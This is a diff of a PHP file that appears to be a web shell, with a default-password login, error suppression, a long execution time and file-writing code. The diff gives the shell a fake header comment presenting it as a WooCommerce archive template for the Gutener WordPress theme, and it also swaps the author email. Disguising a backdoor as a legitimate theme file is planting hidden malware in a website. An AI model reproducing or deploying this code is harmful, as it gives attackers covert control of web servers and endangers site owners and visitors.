@@ -1,7 +1,10 @@
 <?php
-/*
-tester
-*/
+/**
+ * The template for displaying archived woocommerce products
+ *
+ * 
+ * @package Gutener
+ */
 @error_reporting(E_ERROR);
 @ini_set('display_errors', 'Off');
 @ini_set('max_execution_time', 10000);
@@ -42,7 +45,7 @@ if (function_exists('pg_close')) {
 }
 $password = '37bd8d4f5adc469f75bdc73b2f8edccc'; //Default Pass: admin
 $win = substr(PHP_OS, 0, 3) == 'WIN' ? true : false;
-$msg = '(kiwwkw@gmail.com)'; //Copyright Do not Remove
+$msg = '(test@gmail.com)'; //Copyright Do not Remove
 function filew($filename, $filedata, $filemode)
 {
     if (!is_writable($filename) && file_exists($filename)) {
